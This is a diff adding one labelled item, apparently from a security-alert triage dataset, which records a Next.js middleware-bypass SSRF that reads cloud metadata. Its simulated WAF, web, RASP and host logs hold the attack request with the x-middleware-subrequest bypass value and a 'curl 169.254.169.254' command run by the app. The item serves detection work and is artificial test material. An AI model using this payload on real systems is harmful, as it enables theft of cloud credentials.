@@ -1,0 +1,49 @@
+{
+ "unit": 1016,
+ "gt": {
+  "gt_class": "new",
+  "gt_case": null,
+  "confidence": "high",
+  "needs_review": false,
+  "reason": "不属于已入库的 8 个案例家族"
+ },
+ "technique": "Next.js 中间件子请求伪造（x-middleware-subrequest）→ SSRF 读云元数据",
+ "sources": [
+  "waf",
+  "web",
+  "rasp",
+  "hids"
+ ],
+ "logs": [
+  {
+   "timestamp": "2026-06-07 07:41:05",
+   "source": "waf",
+   "log_id": "WAF0243774",
+   "content": "/api/avatar url=http://169.254.169.254/latest/meta-data/&x-middleware-subrequest=middleware:middleware:middlew",
+   "event_id": "1016-WAF0243774"
+  },
+  {
+   "timestamp": "2026-06-07 07:41:06",
+   "source": "web",
+   "log_id": "WEB0245361",
+   "content": "/api/avatar url=http://169.254.169.254/latest/meta-data/&x-middleware-subrequest=middleware:middleware:middlew",
+   "event_id": "1016-WEB0245361"
+  },
+  {
+   "timestamp": "2026-06-07 07:41:07",
+   "source": "rasp",
+   "log_id": "RASP0269700",
+   "content": "https://app-node-149.ops-corp.com/api/avatar {\"ssrf\": \"169.254.169.254\", \"bypass\": \"x-middleware-subrequest\"} ",
+   "event_id": "1016-RASP0269700"
+  },
+  {
+   "timestamp": "2026-06-07 07:43:08",
+   "source": "hids",
+   "log_id": "HID0264189",
+   "content": "curl 169.254.169.254/latest <== /bin/sh -c 'curl 169.254.169.254' <== /usr/bin/node /opt/app/server.js",
+   "event_id": "1016-HID0264189"
+  }
+ ],
+ "retrieval_full": [],
+ "evidence_for_agent": null
+}
